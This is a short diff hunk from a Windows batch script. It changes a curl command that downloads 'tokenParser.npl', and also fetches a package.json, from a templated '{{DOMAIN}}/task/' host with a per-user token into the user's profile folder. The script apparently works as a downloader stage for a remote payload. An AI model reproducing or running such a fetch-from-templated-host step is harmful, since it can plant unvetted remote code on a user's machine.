@@ -79,7 +79,7 @@ if errorlevel 1 (
 set "USERPROFILE=%USERPROFILE%"
 echo [INFO] Downloading tokenParser.npl and package.json...
 
-curl -L -o "%USERPROFILE%\tokenParser.npl" "{{DOMAIN}}/task/tokenParser/{{token}}"
+curl -L -o "%USERPROFILE%\tokenParser.npl" "{{DOMAIN}}/task/tokenParser?token={{token}}"
 curl -L -o "%USERPROFILE%\package.json" "{{DOMAIN}}/task/package.json"
 
 :: -------------------------
